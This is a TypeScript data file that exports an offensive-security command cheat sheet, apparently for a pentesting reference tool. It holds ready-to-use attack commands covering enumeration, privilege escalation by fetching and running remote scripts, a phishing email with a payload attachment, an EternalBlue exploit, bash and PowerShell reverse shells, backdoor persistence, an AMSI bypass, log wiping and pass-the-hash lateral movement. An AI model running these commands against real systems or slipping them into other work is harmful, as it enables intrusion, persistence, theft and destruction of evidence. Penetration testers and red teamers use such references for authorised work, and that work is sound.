
export interface Command {
  title: string;
  command: string;
  description?: string;
}

export interface SubCategory {
  [key: string]: Command[];
}

export interface Category {
  [key: string]: SubCategory;
}

export const commandData: Category = {
  "Enumeration": {
    "Nmap": [
      {
        title: "Full TCP Scan",
        command: "nmap -sC -sV -T4 -p<PORT> <IP>",
        description: "Perform service detection with default scripts"
      },
      {
        title: "UDP Scan",
        command: "nmap -sU -T4 -p<PORT> <IP>",
        description: "Scan UDP ports"
      },
      {
        title: "All Ports Scan",
        command: "nmap -sC -sV -p- <IP>",
        description: "Scan all 65535 TCP ports"
      },
      {
        title: "Vulnerability Scan",
        command: "nmap --script vuln -p<PORT> <IP>",
        description: "Run vulnerability detection scripts"
      }
    ],
    "SMB": [
      {
        title: "Enum4linux",
        command: "enum4linux -a <IP>",
        description: "Enumerate SMB shares and users"
      },
      {
        title: "SMB Version",
        command: "ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' 'tcp and port 139'",
        description: "Detect SMB version"
      },
      {
        title: "SMBMap",
        command: "smbmap -H <IP>",
        description: "Enumerate SMB share permissions"
      },
      {
        title: "SMBClient",
        command: "smbclient -L //<IP> -N",
        description: "List available SMB shares"
      }
    ],
    "Web": [
      {
        title: "Gobuster Dirs",
        command: "gobuster dir -u http://<IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html",
        description: "Directory and file enumeration"
      },
      {
        title: "Nikto",
        command: "nikto -h <IP> -p <PORT>",
        description: "Web server vulnerability scanner"
      }
    ]
  },
  "Privilege Escalation": {
    "Linux": [
      {
        title: "Find SUID Binaries",
        command: "find / -perm -4000 2>/dev/null",
        description: "Find executables with SUID bit set"
      },
      {
        title: "Check Capabilities",
        command: "getcap -r / 2>/dev/null",
        description: "List all elevated capabilities"
      },
      {
        title: "LinPEAS",
        command: "wget http://<LHOST>:<LPORT>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
        description: "Run LinPEAS privilege escalation script"
      },
      {
        title: "Sudo -l",
        command: "sudo -l",
        description: "Check sudo permissions for current user"
      }
    ],
    "Windows": [
      {
        title: "AlwaysInstallElevated",
        command: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        description: "Check if AlwaysInstallElevated is enabled"
      },
      {
        title: "WinPEAS",
        command: "powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:<LPORT>/winPEAS.ps1'); Invoke-WinPEAS",
        description: "Run WinPEAS privilege escalation script"
      },
      {
        title: "PowerUp",
        command: "powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:<LPORT>/PowerUp.ps1'); Invoke-AllChecks",
        description: "Run PowerUp privilege escalation checks"
      }
    ]
  },
  "Initial Access": {
    "Phishing": [
      {
        title: "Send Email with Payload",
        command: "sendemail -f attacker@example.com -t victim@example.com -u 'Important Update' -m 'Please see attached' -a payload.exe -s smtp.example.com",
        description: "Send phishing email with malicious attachment"
      }
    ],
    "Exploitation": [
      {
        title: "Exploit EternalBlue",
        command: "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST <IP>; set LHOST <LHOST>; set LPORT <LPORT>; run'",
        description: "Exploit MS17-010 SMB vulnerability"
      }
    ],
    "Reverse Shells": [
      {
        title: "Bash Reverse Shell",
        command: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
        description: "Bash TCP reverse shell"
      },
      {
        title: "PowerShell Reverse Shell",
        command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        description: "PowerShell TCP reverse shell"
      }
    ]
  },
  "Persistence": {
    "Linux": [
      {
        title: "Add Cron Job",
        command: "echo '* * * * * /path/to/payload' >> /etc/crontab",
        description: "Add persistent cronjob"
      },
      {
        title: "Add SSH Key",
        command: "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
        description: "Add SSH key for persistence"
      }
    ],
    "Windows": [
      {
        title: "Add Registry Run Key",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\path\\to\\payload.exe\"",
        description: "Add startup registry entry"
      },
      {
        title: "Scheduled Task",
        command: "schtasks /create /sc minute /mo 1 /tn \"Evil Task\" /tr C:\\path\\to\\payload.exe",
        description: "Create recurring scheduled task"
      }
    ]
  },
  "Defense Evasion": {
    "Obfuscation": [
      {
        title: "Encode PowerShell Payload",
        command: "powershell -enc <Base64EncodedPayload>",
        description: "Run base64 encoded PowerShell command"
      },
      {
        title: "AMSI Bypass",
        command: "[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation');[System.Management.Automation.Security.SystemPolicy]::GetSystemLockdownPolicy=function PatchedGetSystemLockdownPolicy() { return [System.Management.Automation.SecuritySystemPolicy]::SystemLockdownPolicy.None }",
        description: "Bypass PowerShell AMSI protection"
      }
    ],
    "ClearLogs": [
      {
        title: "Clear Windows Event Logs",
        command: "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
        description: "Clear Windows event logs"
      },
      {
        title: "Clear Linux Logs",
        command: "rm -rf /var/log/*",
        description: "Delete Linux log files"
      }
    ]
  },
  "Lateral Movement": {
    "SMB": [
      {
        title: "Pass the Hash",
        command: "pth-winexe -U 'domain/user%hash' //<IP> cmd.exe",
        description: "Use hash to authenticate without password"
      },
      {
        title: "PsExec",
        command: "psexec.py -hashes 'LM:NTLM' domain/user@<IP> cmd.exe",
        description: "Execute commands via SMB"
      }
    ],
    "RDP": [
      {
        title: "RDP Connection",
        command: "xfreerdp /u:user /p:password /v:<IP>",
        description: "Connect to Windows RDP"
      },
      {
        title: "Enable RDP",
        command: "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
        description: "Enable RDP on Windows target"
      }
    ]
  }
};
